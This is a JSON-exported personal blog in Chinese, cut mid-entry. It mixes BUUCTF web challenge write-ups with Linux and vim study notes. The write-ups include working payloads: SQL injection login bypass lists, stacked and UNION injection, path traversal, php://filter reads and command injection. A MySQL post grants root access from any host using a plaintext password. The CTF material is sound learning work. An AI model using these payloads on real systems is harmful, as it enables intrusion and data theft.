www.tar.gz www.tar web.zip web.rar web.zip web.7z web.tar.gz web.tar wwwroot.rar web.rar 下来之后就可以得到一个index.php.bak备份文件，看到源码： &lt;?php include_once \"flag.php\"; if(isset($_GET['key'])) { $key = $_GET['key']; if(!is_numeric($key)) { exit(\"Just num!\"); } $key = intval($key); $str = \"123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3\"; if($key == $str) { echo $flag; } } else { echo \"Try to find out source file!\"; } 可以知道是弱类型比较：对数据的类型要求并不严格，可以让数据类型互相转换。 “==”类型转换的规则： 1、字符串和数字比较，字符串会自动被转换成数字。 ​ “admin”==0(true)：admin被转换成数字，由于admin是字符串，转换失败，int（admin）=0，所以比较结果是true。 2、混合字符串转换成数字，看字符串的第一个。 “1admin” == 1 类似的还有MD5弱类型比较等。所以payload就为：index.php?key=123，得到flag{0951de20-f469-458f-8e3b-ffc4d519580a} 19.[护网杯 2018]easy_tornado主要考察的是模板注入 相关学习：Python-模板注入 - ZM思 - 博客园 首先根据easy_tornado和render函数可知这个题和服务器模板注入有关。因为render（）是tornado里的函数，可以生成html模板。tornado是用Python编写的Web服务器兼Web应用框架，简单来说就是用来生成模板的东西。和Python相关，和模板相关，就可以推测这可能是个ssti注入题了。（详情请看SSTI完全学习）。 但是目前还缺一个cookie_secret，这是就可以查这个一般在模板框架的什么位置，通过查阅发现在handler.settings中，详细说明见： https://blog.csdn.net/weixin_45642610/article/details/112519061 这样就得到密钥了，就可以根据公式拿flag了。这里贴上md5加密脚本： import hashlib hash = hashlib.md5() #创建md5加密对象 hash.update(\"/fllllllllllllag\".encode('UTF-8')) #更新对象要加密的字符串，要先UTF-8编码成二进制，因为md5只加密二进制 s1=hash.hexdigest()#以十六进制输出密文 hash = hashlib.md5()#按要求重复步骤 hash.update((\"88418b16-e8cf-4a57-9b43-2abd81796dea\"+s1).encode('utf-8')) print(hash.hexdigest()) 20.[极客大挑战 2019]BuyFlag这题考查的主要是 进入题目看到一段话： 可以看到有身份认证相关，同时还有password，可以先看看cookie，看到user=0，大致猜个0是false，1是true，所以改为1。 然后查看页面源代码发现有段代码： &lt;!-- ~~~post money and password~~~ if (isset($_POST['password'])) { $password = $_POST['password']; if (is_numeric($password)) { echo \"password can't be number&lt;/br&gt;\"; }elseif ($password == 404) { echo \"Password Right!&lt;/br&gt;\"; } } --&gt; 就是弱比较，payload：password=404a，成功绕过: 此时就差买flag了，注意上面的源码，也有post money，这个别忘了！那就payload：password=404a&amp;money=100000000: 提示太长了，那就用科学计数法，payload：password=404a&amp;money=10e8，得到flag😊： 好啦，又是十道题，继续努力，主要就是见题型吧，以及拿到一道题该怎么出发。","categories":[{"name":"CTF","slug":"CTF","permalink":"https://huhu-myh.github.io/categories/CTF/"}],"tags":[{"name":"buu练习","slug":"buu练习","permalink":"https://huhu-myh.github.io/tags/buu%E7%BB%83%E4%B9%A0/"}],"author":"myh"},{"title":"Linux学习-第三章","slug":"Linux学习-第三章","date":"2022-01-17T06:38:08.000Z","updated":"2022-02-06T11:56:23.411Z","comments":true,"path":"posts/myh10007.html","link":"","permalink":"https://huhu-myh.github.io/posts/myh10007.html","excerpt":"","text":"第三章：使用编辑器3.1 检查vim软件包，安装vim有的发行版默认的vim编辑器并不是完整的包，只是vim.tiny ，提供少量的编辑功能。所以首先检查一下包： $ which vi /usr/bin/vi $ readlink -f /usr/bin/vi #readlink –f命令能够立刻找出链接文件的最后一环。 /usr/bin/vim.tiny 此时就要安装vim： $ sudo apt-get install vim $ readlink -f /usr/bin/vi /usr/bin/vim.basic #安装成功了 3.2 vim基础启动vim编辑器: $ vim file 如在启动vim时未指定文件名，或者这个文件不存在， vim会开辟一段新的缓冲区域来编辑。如果你在命令行下指定了一个已有文件的名字， vim会将文件的整个内容都读到一块缓冲区域来准备编辑 。 vim编辑器会检测会话终端的类型，并用全屏模式将整个控制台窗口作为编辑器区域。最初的vim编辑窗口显示了文件的内容（如果有内容的话），并在窗口的底部显示了一条消息行。如果文件内容并未占据整个屏幕， vim会在非文件内容行放置一个波浪线 。如图： vim编辑器有两种操作模式： 普通模式 插入模式 刚打开要编辑的文件时（或新建一个文件时）， vim编辑器会进入普通模式。在普通模式中， vim编辑器会将按键解释成命令。 在插入模式下， vim会将你在当前光标位置输入的每个键都插入到缓冲区。按下i键就可以进入插入模式。要退出插入模式回到普通模式，按下键盘上的退出键（ ESC键）就可以了。 在普通模式中，可以用方向键在文本区域移动光标 或者使用如下键： h：左移一个字符。 j：下移一行（文本中的下一行）。 k：上移一行（文本中的上一行）。 l：右移一个字符。 在大的文本文件中一行一行地来回移动会特别麻烦，幸而vim提供了一些能够提高移动速度的命令。 PageDown（或Ctrl+F）：下翻一屏。 PageUp（或Ctrl+B）：上翻一屏。 G：移到缓冲区的最后一行。 num G：移动到缓冲区中的第num行。 gg：移到缓冲区的第一行。 vim编辑器在普通模式下有个特别的功能叫命令行模式。命令行模式提供了一个交互式命令行，可以输入额外的命令来控制vim的行为。要进入命令行模式，在普通模式下按下冒号键。光标会移动到消息行，然后出现冒号，等待输入命令。 在命令行模式下有几个命令可以将缓冲区的数据保存到文件中并退出vim。 q：如果未修改缓冲区数据，退出 q!：取消所有对缓冲区数据的修改并退出。 w filename：将文件保存到另一个文件中。 wq：将缓冲区数据保存到文件中并退出。 3.3 编辑数据在插入模式下，你可以向缓冲区插入数据。然而有时将数据输入到缓冲区中后，你需要再对其进行添加或删除。在普通模式下， vim编辑器提供了一些命令来编辑缓冲区中的数据。下表列出了一些常用的vim编辑命令。 命令 描述 dd 删除当前光标所在行 x 删除当前光标所在位置的字符 dw 删除当前光标所在位置的单词 d$ 删除当前光标所在位置至行尾的内容 u 撤销前一编辑命令 J 删除当前光标所在行行尾的换行符（拼接行） A 在当前光标所在行行尾追加数据（直接进入了插入模式） a 在当前光标后追加数据（直接进入了插入模式） r char 用char替换当前光标所在位置的单个字符 说明 在vim编辑器的普通模式下使用退格键（ Backspace键）和删除键（ Delete键）时要留心。vim编辑器通常会将删除键识别成x命令的功能，删除当前光标所在位置的字符。 vim编辑器在普通模式下通常不识别退格键。 3.4 复制和粘贴3.4.1 粘贴内容vim在删除数据时，实际上会将数据保存在单独的一个寄存器中。可以用p命令取回数据。 举例来说，可以用dd命令删除一行文本，然后把光标移动到缓冲区的某个要放置该行文本的位置，然后用p命令。该命令会将文本插入到当前光标所在行之后。可以将它和任何删除文本的命令一起搭配使用。 (注意p命令粘贴的只是上一次删除的内容。) 3.4.2 复制内容vim中复制命令是y（代表yank）。可以在y后面使用和d命令相同的第二字符（ yw表示复制一个单词， y$表示复制到行尾）。在复制文本后，把光标移动到你想放置文本的地方，输入p命令。复制的文本就会出现在该位置 。 3.4.3 复制内容-可视化模式按下v键进入可视化模式。下一步，移动光标来覆盖你想要复制的文本（甚至可以向下移动几行来复制更多行的文本）。在移动光标时， vim会高亮显示复制区域的文本。在覆盖了要复制的文本后，按y键来激活复制命令。移动光标到要放置的位置，使用p命令来粘贴。 3.5 查找和替换3.5.1 查找按下斜线 /键，光标会跑到消息行，然后vim会显示出斜线。在输入你要查找的文本后，按下回车键。会出现三种可能的结果： 要查找的文本出现在光标当前位置之后，则光标会跳到该文本出现的第一个位置。 要查找的文本未在光标当前位置之后出现，则光标会绕过文件末尾，出现在该文本所在的第一个位置（并用一条消息指明）。 输出一条错误消息，说明在文件中没有找到要查找的文本。 要继续查找同一个单词，按下斜线键，然后按回车键。或者使用n键，表示下一个（ next）。 3.5.2 替换必须进入命令行模式才能使用替换命令。替换命令的格式是：:s/old/new/ ，vim编辑器会跳到old第一次出现的地方，并用new来替换。 可以对替换命令作一些修改来替换多处文本： :s/old/new/g：替换光标所在行的所有old。 :n,ms/old/new/g：替换行号n和m之间所有old。 :%s/old/new/g：替换整个文件中的所有old。 :%s/old/new/gc：替换整个文件中的所有old，但在每次出现时提示。 这里就是基本的vim编辑器命令，需要经常使用增加手指记忆，还有许多其他的编辑器，先学会这个再学学别的~ 文章参考：Linux命令行与shell脚本编程大全.第3版 by 布鲁姆，布雷斯纳汉 (z-lib.org)","categories":[{"name":"学习","slug":"学习","permalink":"https://huhu-myh.github.io/categories/%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"linux","slug":"linux","permalink":"https://huhu-myh.github.io/tags/linux/"}],"author":"myh"},{"title":"Linux登录mysql报错","slug":"Linux登录mysql报错","date":"2022-01-16T03:53:04.000Z","updated":"2022-01-16T07:19:22.142Z","comments":true,"path":"posts/myh10006.html","link":"","permalink":"https://huhu-myh.github.io/posts/myh10006.html","excerpt":"","text":"mysql登录报错：ERROR 1045 (28000)在使用xshell连接服务器登陆mysql的时候，出现Access denied for user ‘root’@’localhost’ (using password: YES) 拒绝访问。emmm这就很尴尬，接着我登上服务器的终端也不行，查了一下解决方法如下： 1、vim /etc/my.cnf文件sudo vim /etc/my.cnf 在 [mysqld] 后添加 skip-grant-tables （跳过检查），然后按esc、ZZ退出。 2、重启MySQL服务：sudo systemctl restart mysqld 3、修改密码set password for 'root'@'localhost'=password('你的密码'); 可能会出现 ERROR 1290 (HY000): The MySQL server is running with the –skip-grant-tables option so it cannot execute this statement 的报错，输入 ：flush privileges; flush privileges; 4、再次重新设置密码set password for 'root'@'localhost'=password('你的密码'); 5、重设远程访问GRANT ALL PRIVILEGES ON *.* TO 'root'@'%' IDENTIFIED BY 'Mingloveyh1314' WITH GRANT OPTION; 6、把skip-grant-tables删除sudo vim /etc/my.cnf 7、重启MySQLsudo systemctl restart mysqld 之后就可以正常登陆了~","categories":[{"name":"运维","slug":"运维","permalink":"https://huhu-myh.github.io/categories/%E8%BF%90%E7%BB%B4/"}],"tags":[{"name":"linux","slug":"linux","permalink":"https://huhu-myh.github.io/tags/linux/"}],"author":"myh"},{"title":"Linux学习-第二章","slug":"Linux学习-第二章","date":"2022-01-15T09:28:46.000Z","updated":"2022-02-06T11:56:18.817Z","comments":true,"path":"posts/myh10005.html","link":"","permalink":"https://huhu-myh.github.io/posts/myh10005.html","excerpt":"","text":"第二章：基本的 bash shell 命令2.1浏览文件系统2.1.1 Linux文件系统Linux不同于WIndows，在路径名中不使用驱动器盘符。 Linux将文件存储在单个目录结构中，这个目录被称为虚拟目录（ virtual directory）。虚拟目录将安装在PC上的所有存储设备的文件路径纳入单个目录结构中。Linux虚拟目录结构只包含一个称为根（ root）目录的基础目录。根目录下的目录和文件会按照访问它们的目录路径一一列出，这点跟Windows类似。 在Linux PC上安装的第一块硬盘称为根驱动器。根驱动器包含了虚拟目录的核心，其他目录都是从那里开始构建的。Linux会在根驱动器上创建一些特别的目录，我们称之为挂载点（ mount point）。挂载点是虚拟目录中用于分配额外存储设备的目录。虚拟目录会让文件和目录出现在这些挂载点目录中，然而实际上它们却存储在另外一个驱动器中。 如图Disk1硬盘和虚拟目录的根目录关联起来。Disk2硬盘就可以挂载到虚拟目录结构中的任何地方。在这个例子中，第二块硬盘被挂载到了/home位置，home这个目录就是一个挂载点，用户目录都位于这个位置。 ​ 常见的Linux目录名称 / 虚拟目录的根目录。通常不会在这里存储文件 /bin 二进制目录，存放许多用户级的GNU工具 /bot 启动目录，存放启动文件 /dev 设备目录， Linux在这里创建设备节点 /etc 系统配置文件目录 /home 主目录， Linux在这里创建用户目录 /lib 库目录，存放系统和应用程序的库文件 /media 媒体目录，可移动媒体设备的常用挂载点 /mnt 挂载目录，另一个可移动媒体设备的常用挂载点 /opt 可选目录，常用于存放第三方软件包和数据文件 /proc 进程目录，存放现有硬件及当前进程的相关信息 /root root用户的主目录 /sbin 系统二进制目录，存放许多GNU管理员级工具 /run 运行目录，存放系统运作时的运行时数据 /srv 服务目录，存放本地服务的相关文件 /sys 系统目录，存放系统硬件信息的相关文件 /tmp 临时目录，可以在该目录中创建和删除临时工作文件 /usr 用户二进制目录，大量用户级的GNU工具和数据文件都存储在这里 /var 可变目录，用以存放经常变化的文件，比如日志文件 2.1.2 遍历目录在Linux文件系统上，可以使用切换目录命令cd将shell会话切换到另一个目录。 cd命令的格式非常简单：cd destinationcd命令可接受单个参数destination，用以指定想切换到的目录名。如果没有为cd命令指定目标路径，它将切换到用户主目录。destination参数可以用两种方式表示：一种是使用绝对文件路径，另一种是使用相对文件路径。 1.绝对文件路径 ​ 对文件路径总是以正斜线（ /）作为起始，指明虚拟文件系统的根目录。 如图刚开始是在/root目录中，如果切换到usr/bin目录中，就直接使用 cd /usr/bin，（一定最开始是根目录！） 这里的 pwd 是显示当前所在的位置的命令。 2.相对文件路径 就是基于你目前所在的目录进行相对的移动。 如图，刚开始在usr目录中，要进入usr的lib目录中，则可以直接 cd lib 。（ls 是显示当前目录下的文件和子目录，后面会讲。） 有两个特殊字符可用于相对文件路径中： 单点符（ .），表示当前目录； 双点符（ ..），表示当前目录的父目录。 重点就是双点符，可以较为方便的在相对文件路径中使用： 2.2 文件和目录列表2.2.1 基本列表功能ls [path] - 列出文件 该程序ls允许您列出目录中的文件和其子目录。它可以传递许多不同的参数（或“标志”）来控制输出。 ls -F 带-F参数的ls命令轻松区分文件和目录 Linux经常采用隐藏文件来保存配置信息。在Linux上，隐藏文件通常是文件名以点号开始的文件。这些文件并没有在默认的ls命令输出中显示出来，因此我们称其为隐藏文件。 ls支持选项合并如：ls -Fa ls -l 显示附加信息，长列表输出 文件类型，比如目录（ d）、文件（ -）、字符型文件（ c）或块设备（ b）； 文件的权限； 文件的硬链接总数； 文件属主的用户名； 文件属组的组名； 文件的大小（以字节为单位）； 文件的上次修改时间； 文件名或目录名。 2.2.2 过滤输出列表当要输出指定文件或者指定开头等的文件时，可以使用过滤查询：ls -l x ，过滤器就是一个进行简单文本匹配的字符串。可以在要用的命令行参数之后添加这个过滤器 。同时支持通配符匹配。 问号（ ?）代表一个字符； 星号（ *）代表零个或多个字符。 2.2.3 tree还有一个遍历文件功能指令tree,能较好地展示文件之间的层级结构，将本目录中的文件、子目录、子目录中的文件都以树形展示出来：（Debian 版本没有这个指令，可以apt-get tree安装），不要尝试tree /,除非你觉着很炫酷hhhh 2.3 处理文件2.3.1 创建文件touch命令轻松创建空文件（注意是空文件，不代表可以是空目录哦）。 $ touch test_one 2.3.2 复制文件cp命令将文件或目录从一个位置复制到另一个位置 。 $ cp &lt;source&gt; &lt;destination&gt; - 复制文件 -i选项，强制shell询问是否需要覆盖已有文件。 -R参数，可以用它在一条命令中递归地复制整个目录的内容 可以看到加上 -i 选项，就会强制询问是否覆盖，最好每次都带上，写 yes/no 就可。可以看到修改时间没变。 cp命令的-R参数。可以用它在一条命令中递归地复制整个目录的内容。 2.3.3 移动和重命名文件在Linux中，重命名文件称为移动（ moving） 。 mv命令可以将文件和目录移动到另一个位置或重新命名。 # Moving a file \"into\" another file is how you rename files root@VM-16-11-debian:/tmp/test# mv test_file test_file1 root@VM-16-11-debian:/tmp/test# ls -F test2/ testdir/ test_file1 test_file2 # Move file into directory root@VM-16-11-debian:/tmp/test# mv test_file1 testdir/ root@VM-16-11-debian:/tmp/test# tree . ├── test2 │ ├── test_file │ └── test_file2 ├── testdir │ └── test_file1 └── test_file2 2 directories, 4 files 2.3.4 删除文件在Linux中，删除（ deleting）叫作移除（ removing） 。 bash shell中删除文件的命令是 rm。 -+ `rm &lt;filename&gt;` - 永久删除文件 -i命令参数提示你是不是要真的删除该文件 -r参数删除目录 root@VM-16-11-debian:/tmp/test/test2# rm -i test_file rm: remove regular empty file 'test_file'? y root@VM-16-11-debian:/tmp/test/test2# ls -l total 0 -rw-r--r-- 1 root root 0 Jan 16 15:35 test_file2 -r参数删除目录： root@VM-16-11-debian:/tmp/test# rm -r test2 root@VM-16-11-debian:/tmp/test# tree . ├── testdir │ └── test_file1 └── test_file2 1 directory, 2 files 2.4 处理目录2.4.1 创建目录$ mkdir New_Dir -p参数：同时创建多个目录和子目录 root@VM-16-11-debian:/tmp/test# mkdir -p test2/test3 root@VM-16-11-debian:/tmp/test# tree . ├── test2 │ └── test3 ├── testdir │ └── test_file1 └── test_file2 3 directories, 2 files 2.4.2 删除目录rmdir命令只删除空目录。 $ rmdir mydir root@VM-16-11-debian:/tmp/test# rmdir test2 rmdir: failed to remove 'test2': Directory not empty 2.5 查看文件2.5.1 查看文件类型在显示文件内容之前，应该先了解一下文件的类型。如果打开了一个二进制文件，你会在屏幕上看到各种乱码，甚至会把你的终端仿真器挂起。 $ file my_file root@VM-16-11-debian:/tmp/test# file testdir testdir: directory 2.5.2 查看整个文件cat &lt;filename&gt; - 打印文件 要将文件的内容快速转储到控制台，请使用cat. $ cat file1 -n参数会给所有的行加上行号。 -b参数会给只是文本的行加上行号。 The quick brown fox jumped over the lazy dog. more命令 cat命令的主要缺陷是：一旦运行，你就无法控制后面的操作。为了解决这个问题，开发人员编写了more命令。 more命令会显示文本文件的内容，但会在显示每页数据之后停下来。 可以通过按空格键或回车键以逐行向前的方式浏览文本文件。浏览完之后，按q键退出。 less命令 less &lt;filename&gt; - 显示和滚动文件 less如果您想查看一个不完全适合一个屏幕的长文件的内容，该程序很有用。要在运行后退出，请按 q。 你可以用更少的时间做很多其他的事情，但一件有用的事情是能够搜索。您可以搜索/banana以查找文件中“香蕉”的所有实例。 2.5.3 查看部分文件 tail命令tail命令会显示文件最后几行的内容（文件的“尾部”）。默认情况下，它会显示文件的末尾10行。 可以向tail命令中加入-n参数来修改所显示的行数: tail -2 text 。 head命令 head命令，顾名思义，会显示文件开头那些行的内容。默认情况下，它会显示文件前10行的文本。同理可以加入 -n 参数指定行数。 本章的学习就到这啦，下章将继续讨论bash shell的命令，并了解更多管理Linux系统时经常用到的高级系统管理命令。 文章参考：Linux命令行与shell脚本编程大全.第2版 by 布鲁姆，布雷斯纳汉 (z-lib.org)","categories":[{"name":"学习","slug":"学习","permalink":"https://huhu-myh.github.io/categories/%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"linux","slug":"linux","permalink":"https://huhu-myh.github.io/tags/linux/"}],"author":"myh"},{"title":"buuctf练习[1-10]","slug":"buuctf练习","date":"2022-01-15T07:03:43.000Z","updated":"2022-01-19T07:05:03.404Z","comments":true,"path":"posts/myh10004.html","link":"","permalink":"https://huhu-myh.github.io/posts/myh10004.html","excerpt":"","text":"1.[HCTF 2018]Warmup考察：php审计：mb_substr()+mb_strpos()绕过 打开题目地址后出现的是一个滑稽的表情，接着查看原码发现注释有 source.php ，访问后得到一段源码： &lt;?php highlight_file(__FILE__); class emmm { public static function checkFile(&amp;$page) { $whitelist = [\"source\"=&gt;\"source.php\",\"hint\"=&gt;\"hint.php\"]; //白名单 if (! isset($page) || !is_string($page)) { echo \"you can't see it\"; return false; } if (in_array($page, $whitelist)) { return true; } $_page = mb_substr( $page, 0, mb_strpos($page . '?', '?') ); if (in_array($_page, $whitelist)) { return true; } $_page = urldecode($page); $_page = mb_substr( $_page, 0, mb_strpos($_page . '?', '?') ); if (in_array($_page, $whitelist)) { return true; } echo \"you can't see it\"; return false; } } if (! empty($_REQUEST['file']) &amp;&amp; is_string($_REQUEST['file']) &amp;&amp; emmm::checkFile($_REQUEST['file']) //需要同时满足三个条件：传入了file参数，并且是字符串，并且满足checkfile函数 ) { include $_REQUEST['file']; //执行给出的file参数值 exit; } else { echo \"&lt;br&gt;&lt;img src=\\\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\\\" /&gt;\"; } ?&gt; flag{408cfb51-0d75-4976-9d2e-e431e5d0fd77} 先来介绍下两个函数mb_substr()+mb_strpos()： **mb_strpos()**：返回要查找的字符串在别一个字符串中首次出现的位置 mb_strpos( string $haystack, string $needle, ):int // haystack：要被检查的字符串。 // needle：要搜索的字符串 **mb_substr()** 函数返回字符串的一部分。 mb_substr( string $str, int $start, int $length = NULL, ):string //str 必需。从该 string 中提取子字符串。 //start 必需。规定在字符串的何处开始。 //ength 可选。规定要返回的字符串长度。默认是直到字符串的结尾 request() //可以以get或者post提交参数 include //文件包含,包含并运行文件中的内容 $_page . '?' //将$_page后拼接 ? public static function checkFile(&amp;$page) &amp;&amp; emmm::checkFile($_REQUEST['file']) 上面这代码表示 将request的file值 传入$page，其实就是将file参数传入到page中 &amp;引用传递变量。这是通过在函数内建立一个本地变量并且该变量在呼叫范围内引用了同一个内容来实现的。例如： &lt;?php function sub (&amp;$var) { $var++; } $num=5; sub($num); ?&gt; 将使 $num 变成 6。这是因为在 sub 函数中变量 $var 指向了和 $num 指向的同一个内容。 ​ 通过源码提示hin.php，访问之后得到flag在ffffllllaaaagggg中，所以我们肯定要使include包含这个文件，从而得到我们的flag。但是通过checkfile函数可知，返回true的条件是所传入的file参数值（或者是经过函数处理后的值）需要在白名单里，所以直接传入ffffllllaaaagggg肯定不得行。这是最终要的来啦，就是考虑题目给的函数，通过函数的处理的值使得我们能够返回true。所以构造payload为： 1.file=source.php?/../../../../../ffffllllaaaagggg 2.file=source.php%3f/../../../../../ffffllllaaaagggg //这里的%3f是 ? 经过ulr加密后的值，由于每次传参十，都会自动urldecode一次，所以等价于第一个 3.file=source.php%253f/../../../../../ffffllllaaaagggg //这里的%253f是 ? 经过两次ulr加密后的值，在经过一次自动处理以及checkfile函数里的urldecode函数处理一次后就等价于第一个了，同样可以返回true //说明一下../是返回上一级目录，首先在source.php?加一个 / ，使其成为不存在的目录，然后../就返回到source.php所在的目录，之后一次次试在哪个目录里，自己也可以在本地试试../的目录关系 之后传入payload就会得到flag啦~ 再补充一下 ./ ../ / 的说明： ./ 表示当前目录下 ../ 表示上一级目录 / 表示根目录 如图，以这个文件夹为例，在buu文件中，有2.png，那就表示为 ./buuctf练习/1.png 在此目录下，有hello.md，那就表示为： ./hello.md 或者 hello.md 如果2.png在上层目录的一个image文件下，那就是： ../image/1.png 2.[极客大挑战 2019]EasySQL根据题目提示是SQL注入，所以先试着判断注入点和引号闭合方式：在username输入：1’，密码随便输：1，出现语法报错： 则可以知道是单引号闭合，接着开始试试万能密码：1’ or 1=1# ,则输入后后台语句大致就是： select * from table_name where username='1' or 1=1 # ' and password='1' ; 由于#会把后面的都注释掉，所以就等价于： select * from table_name where username='1' or 1=1 可知 1=1 是个恒等式，所以就登陆成功了，得到flag~ 下面收集一些万能密码： 'or'='or' 'or 1=1-- ''or 1=1-- 'or'a'='a \"or \"a\"=\"a \"or\"=\"a'='a ')or('a'='a or 1=1-- a'or' 1=1-- \"or\"=\"a'='a 'or''=' 1 or '1'='1'=1 1 or '1'='1' or 1=1 'OR 1=1%00 \"or 1=1%00 'xor admin' or 'a'='a 密码随便 3.[极客大挑战 2019]Havefun这题还是比较简单的哈，进去之后就是一张可爱的猫猫图，有点乖哈哈，查看网页源代码，发现有一段PHP代码，就是get型参数传入： 然后构造payload为：http://49122460-5b04-4fd8-b15c-e5fad13e769c.node4.buuoj.cn:81/?cat=dog就可以了~ 4.[ACTF2020 新生赛]Include从题目可以看出来考察的是文件包含，进入题目看到tip，点击，网页进行了跳转，此时发现url为： 可以看到后面有get型参数file值传入，此时传入参数后回显为这句话，那我们就直接通过==php://filter伪协议==读取整个flag.php，构造payload为： 可以看到有一串base64加密的编码，解密后得到flag： &lt;?php echo \"Can you find out the flag?\"; //flag{0f1d073a-d716-4aa6-ae19-16dbba744a1d} 5.[强网杯 2019]随便注从题目知应该是SQL注入，进入题目看到有一个输入框，输入 1 ，正常返回，加个单引号 1’ 返回SQL语句错误，即存在SQL注入 然后使用order by 2,order by 3 查看列数，发现只有两列 尝试使用联合查询union select 发现回显语是select被正则过滤了 emmm,开始大小写、联合注释等绕过waf,但是没得用就很气呦……，后来查了下资料原来是忽略掉的堆叠注入！，那就开始直接查看表名： 1';show tables; --+ //在SQL中，分号（;）是用来表示一条sql语句的结束。堆叠注入就是结束一个sql语句后，会继续执行下一条构造的SQL语句。 然后对应查看对应的列名： 1';show columns from words; --+ 1';show columns from `1919810931114514`; --+ //字符串为表名操作时要加反引号 这里可以看到我们要的flag是在对应的表中，根据第一次输入 1 的结果来看后台的语句应该是: select * from words where id = 所以我们目前最重要的就是从另一个表中获得数据，但是我们只能从 “word” 这个表里取数据，然后看了别人的文章发现还可以改表的名称来读flag! 所以，思路就很清晰了： 更改表的名称。将words改为随便其他的名字比如words1，然后将”1919810931114514”表的名字替换为words 给新的words表增加一列id 构造payload为（提醒： 字符串为表名操作时要加反引号！！！）： 1';rename table words to word1;rename table `1919810931114514` to words;alter table words add id int unsigned not Null auto_increment primary key; --+ //这里使用了rename和alert，具体用法可以查一下，不在正则过滤的范围内 //注意一定要使用反引号！ 接着再查看下表，其实就已经查出来flag了，啊tql，学到了~ 最后感谢有人复现让我学习：https://github.com/CTFTraining/qwb_2019_supersqli 6.[SUCTF 2019]EasySQL这题给我整不会了，刚开始试了联合不行，也没报错，报错注入也没了，布尔、时间也不得行了，又是看别人解题的一次，原来还可以猜后端代码:惊恐:。 select $_GET['query'] || flag from flag 然后构造payload为：*,1(或者其他常数) 我接着自己在本地的test数据库尝试了一下，直接构造： select 1 from salaries; 确实直接 select 一个常数会直接新增一个临时的列，并且每一行的数值都是这个常数，再来说一下这个 || ，在mysql里，只要 || 前面的成立，后面的便不再执行，同理，前面的不成立会执行后面的 。如果我们直接构造 : select *||salary from salaries 可以看到会报语法错误，所以最终就是大佬的构造方法： select *,1||salary from salaries 可以看到新增加了一列并且这个表中的数据也都显示出来了，大佬们牛批！最后解题拿flag： 7.[ACTF2020 新生赛]Exec考察的是远程命令执行，emm我也是第一次做这种题，百度了一下网站的ping漏洞，发现可能存在远程执行命令的漏洞，就开始尝试~ 首先讲几个知识点： 命令连接符 cmd1 ; cmd2 ; cmd3 分号 ; 可以进行多条命令的无关联执行，每一条执行结果不会影响其他命令的执行 cmd1 &amp;&amp; cmd2 左边的command1执行成功(返回0表示成功)后， &amp;&amp; 右边的command2才能被执行。 cmd1 | cmd2 | 表示管道，上一条命令的输出，作为下一条命令的输入 cmd1 || cmd2 || 表示上一条命令执行失败后，才执行下一条命令 下面开始做题： 首先ls查看一下当前目录有没有flag文件等，发现没得： 然后尝试遍历父目录可以看到有flag文件： 这样直接cat ../../../flag拿到flag: 8.[极客大挑战 2019]Secret File考察的是伪协议读取文件，难点就是怎么读到flag.php中的flag。 进入题目查看源代码发现提示有：/Archive_room.php ，接着点发现有：/action.php ，但是访问直接过去了跳到：/end.php，开始抓包： 发现有secr3t.php，访问之后看到一段代码： &lt;html&gt; &lt;title&gt;secret&lt;/title&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;?php highlight_file(__FILE__); error_reporting(0); $file=$_GET['file']; if(strstr($file,\"../\")||stristr($file, \"tp\")||stristr($file,\"input\")||stristr($file,\"data\")){ echo \"Oh no!\"; exit(); } include($file); //flag放在了flag.php里 ?&gt; &lt;/html&gt; 直接访问flag.php会出现贱贱的话，看不到flag，看到php代码里有过滤的，先解释下这两个函数： strstr(string,search,before_search) 搜索字符串在另一字符串中的第一次出现。 返回字符串的剩余部分（从匹配点）。如果未找到所搜索的字符串，则返回 FALSE。 stristr(string,search,before_search) 不区分大小写的strstr（）版本。 看到过滤了input、data，是伪协议里的，那就考虑filter读取文件，构造payload: ?file=php://filter/read=convert.base64-encode/resource=flag.php 页面返回flag.php的源码，解密后看到flag：flag{b3f2f2c1-5e4f-4b48-8bc5-1cf85ef574b2} 9.[极客大挑战 2019]LoveSQL考察联合注入: 首先在username处输入1',password输个1，发现语法报错，即存在sql注入。接着先查看一下字段数： 1' order by 4 # 报错 1' order by 3 # 无报错，说明三个字段 然后试下联合查询爆破所有数据库： 1' union select 1,2,group_concat(schema_name) from information_schema.schemata # 看到有geek，大概率就是他了，接下来查看表名： 1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='geek' # 接着试试查看l0ve1ysq1表里的列名： 1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='l0ve1ysq1' # 最后就可以直接拿数据了： 1' union select 1,2,group_concat(id,username,password) from l0ve1ysq1 # 得到flag{fbee60d0-759c-4012-a59b-bc0509fa5431}。 10.[GXYCTF2019]Ping Ping Ping又是一道命令执行漏洞的题目，不过存在了很多过滤，自己试了多种方法也不得行，看了一个师傅的博客学到了,tql，直接贴链接吧： https://blog.csdn.net/weixin_39190897/article/details/116247765?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522164256111016780274119167%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&amp;request_id=164256111016780274119167&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-3-116247765.pc_search_result_control_group&amp;utm_term=ping%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87&amp;spm=1018.2226.3001.4187 刷了十道题咧，哎，还是太菜了，不果慢慢有节奏了，慢慢学吧~","categories":[{"name":"CTF","slug":"CTF","permalink":"https://huhu-myh.github.io/categories/CTF/"}],"tags":[{"name":"buu练习","slug":"buu练习","permalink":"https://huhu-myh.github.io/tags/buu%E7%BB%83%E4%B9%A0/"}],"author":"myh"},{"title":"Linux学习-第一章","slug":"Linux学习-第一章","date":"2022-01-14T10:52:58.000Z","updated":"2022-01-17T08:17:52.641Z","comments":true,"path":"posts/myh10002.html","link":"","permalink":"https://huhu-myh.github.io/posts/myh10002.html","excerpt":"","text":"第一章：初识Linux1.1 shell​ Linux shell是一种特殊的交互式工具。它为用户提供了启动程序、管理文件系统中的文件以及运行在Linux系统上的进程的途径。 shell的核心是命令行提示符。命令行提示符是shell负责交互的部分。它允许你输入文本命令，然后解释命令，并在内核中执行。 ​ shell包含了一组内部命令，用这些命令可以完成诸如复制文件、移动文件、重命名文件、显示和终止系统中正运行的程序等操作。 shell也允许你在命令行提示符中输入程序的名称，它会将程序名传递给内核以启动它。 ​ 